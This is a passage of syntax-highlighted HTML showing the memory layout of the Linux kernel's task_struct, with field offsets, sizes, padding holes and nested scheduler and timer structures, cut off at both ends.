</span></span><span class="line"><span class="cl"><span class="cm">/*   24      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   32      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |     4 */</span>    <span class="kt">refcount_t</span> <span class="n">usage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   44      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   48      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ptrace</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   52      |     4 */</span>    <span class="kt">int</span> <span class="n">on_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |    16 */</span>    <span class="k">struct</span> <span class="n">__call_single_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>        <span class="k">struct</span> <span class="n">llist_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>            <span class="k">struct</span> <span class="n">llist_node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">llist</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   64      |     4 */</span>        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">u_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>            <span class="kt">atomic_t</span> <span class="n">a_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   68      |     2 */</span>        <span class="n">u16</span> <span class="n">src</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   70      |     2 */</span>        <span class="n">u16</span> <span class="n">dst</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">wake_entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wakee_flips</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   80      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">wakee_flip_decay_ts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   88      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">last_wakee</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |     4 */</span>    <span class="kt">int</span> <span class="n">recent_used_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  100      |     4 */</span>    <span class="kt">int</span> <span class="n">wake_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |     4 */</span>    <span class="kt">int</span> <span class="n">on_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  108      |     4 */</span>    <span class="kt">int</span> <span class="n">prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  112      |     4 */</span>    <span class="kt">int</span> <span class="n">static_prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  116      |     4 */</span>    <span class="kt">int</span> <span class="n">normal_prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  120      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">rt_priority</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |   256 */</span>    <span class="k">struct</span> <span class="n">sched_entity</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |    16 */</span>        <span class="k">struct</span> <span class="n">load_weight</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">weight</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |     4 */</span>            <span class="n">u32</span> <span class="n">inv_weight</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">load</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |    24 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  160      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">run_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  176      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">group_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  184      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">on_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  192      |     8 */</span>        <span class="n">u64</span> <span class="n">exec_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  200      |     8 */</span>        <span class="n">u64</span> <span class="n">sum_exec_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  208      |     8 */</span>        <span class="n">u64</span> <span class="n">vruntime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  216      |     8 */</span>        <span class="n">u64</span> <span class="n">prev_sum_exec_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  224      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_migrations</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  232      |     4 */</span>        <span class="kt">int</span> <span class="n">depth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  240      |     8 */</span>        <span class="k">struct</span> <span class="n">sched_entity</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  248      |     8 */</span>        <span class="k">struct</span> <span class="n">cfs_rq</span> <span class="o">*</span><span class="n">cfs_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  256      |     8 */</span>        <span class="k">struct</span> <span class="n">cfs_rq</span> <span class="o">*</span><span class="n">my_q</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  264      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">runnable_weight</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 48-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  320      |    64 */</span>        <span class="k">struct</span> <span class="n">sched_avg</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  320      |     8 */</span>            <span class="n">u64</span> <span class="n">last_update_time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  328      |     8 */</span>            <span class="n">u64</span> <span class="n">load_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  336      |     8 */</span>            <span class="n">u64</span> <span class="n">runnable_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  344      |     4 */</span>            <span class="n">u32</span> <span class="n">util_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  348      |     4 */</span>            <span class="n">u32</span> <span class="n">period_contrib</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  352      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">load_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  360      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">runnable_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  368      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">util_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  376      |     8 */</span>            <span class="k">struct</span> <span class="n">util_est</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  376      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">enqueued</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  380      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ewma</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">util_est</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):  256 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">se</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  384      |    48 */</span>    <span class="k">struct</span> <span class="n">sched_rt_entity</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  384      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  384      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  392      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">run_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  400      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">timeout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  408      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">watchdog_stamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  416      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">time_slice</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  420      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">on_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  422      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">on_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  424      |     8 */</span>        <span class="k">struct</span> <span class="n">sched_rt_entity</span> <span class="o">*</span><span class="n">back</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   48 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  432      |   224 */</span>    <span class="k">struct</span> <span class="n">sched_dl_entity</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  432      |    24 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  432      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  440      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  448      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">rb_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  456      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  464      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_deadline</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  472      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_period</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  480      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_bw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  488      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_density</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  496      |     8 */</span>        <span class="n">s64</span> <span class="n">runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  504      |     8 */</span>        <span class="n">u64</span> <span class="n">deadline</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  512      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 0   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_throttled</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 1   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_yielded</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 2   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_non_contending</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 3   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_overrun</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |    64 */</span>        <span class="k">struct</span> <span class="n">hrtimer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |    32 */</span>            <span class="k">struct</span> <span class="n">timerqueue_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |    24 */</span>                <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |     8 */</span>                    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  528      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  536      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  544      |     8 */</span>                <span class="kt">ktime_t</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  552      |     8 */</span>            <span class="kt">ktime_t</span> <span class="n">_softexpires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  560      |     8 */</span>            <span class="k">enum</span> <span class="nf">hrtimer_restart</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">hrtimer</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  568      |     8 */</span>            <span class="k">struct</span> <span class="n">hrtimer_clock_base</span> <span class="o">*</span><span class="n">base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  576      |     1 */</span>            <span class="n">u8</span> <span class="n">state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  577      |     1 */</span>            <span class="n">u8</span> <span class="n">is_rel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  578      |     1 */</span>            <span class="n">u8</span> <span class="n">is_soft</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  579      |     1 */</span>            <span class="n">u8</span> <span class="n">is_hard</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">dl_timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |    64 */</span>        <span class="k">struct</span> <span class="n">hrtimer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |    32 */</span>            <span class="k">struct</span> <span class="n">timerqueue_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |    24 */</span>                <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |     8 */</span>                    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  592      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  600      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  608      |     8 */</span>                <span class="kt">ktime_t</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  616      |     8 */</span>            <span class="kt">ktime_t</span> <span class="n">_softexpires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  624      |     8 */</span>            <span class="k">enum</span> <span class="nf">hrtimer_restart</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">hrtimer</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  632      |     8 */</span>            <span class="k">struct</span> <span class="n">hrtimer_clock_base</span> <span class="o">*</span><span class="n">base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  640      |     1 */</span>            <span class="n">u8</span> <span class="n">state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  641      |     1 */</span>            <span class="n">u8</span> <span class="n">is_rel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  642      |     1 */</span>            <span class="n">u8</span> <span class="n">is_soft</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  643      |     1 */</span>            <span class="n">u8</span> <span class="n">is_hard</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">inactive_timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  648      |     8 */</span>        <span class="k">struct</span> <span class="n">sched_dl_entity</span> <span class="o">*</span><span class="n">pi_se</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):  224 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">dl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  656      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">sched_class</span> <span class="o">*</span><span class="n">sched_class</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  664      |    24 */</span>    <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  664      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  672      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  680      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">core_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  688      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">core_cookie</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  696      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">core_occupation</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  704      |     8 */</span>    <span class="k">struct</span> <span class="n">task_group</span> <span class="o">*</span><span class="n">sched_task_group</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  712      |     8 */</span>    <span class="k">struct</span> <span class="n">uclamp_se</span> <span class="n">uclamp_req</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  720      |     8 */</span>    <span class="k">struct</span> <span class="n">uclamp_se</span> <span class="n">uclamp</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 40-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  768      |   256 */</span>    <span class="k">struct</span> <span class="n">sched_statistics</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  768      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  776      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  784      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  792      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  800      |     8 */</span>        <span class="n">u64</span> <span class="n">iowait_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  808      |     8 */</span>        <span class="n">u64</span> <span class="n">iowait_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  816      |     8 */</span>        <span class="n">u64</span> <span class="n">sleep_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  824      |     8 */</span>        <span class="n">u64</span> <span class="n">sleep_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  832      |     8 */</span>        <span class="n">s64</span> <span class="n">sum_sleep_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  840      |     8 */</span>        <span class="n">u64</span> <span class="n">block_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  848      |     8 */</span>        <span class="n">u64</span> <span class="n">block_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  856      |     8 */</span>        <span class="n">s64</span> <span class="n">sum_block_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  864      |     8 */</span>        <span class="n">u64</span> <span class="n">exec_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  872      |     8 */</span>        <span class="n">u64</span> <span class="n">slice_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  880      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_migrations_cold</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  888      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_failed_migrations_affine</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  896      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_failed_migrations_running</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  904      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_failed_migrations_hot</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  912      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_forced_migrations</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  920      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  928      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_sync</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  936      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_migrate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  944      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_local</span><span class="p">;</span>
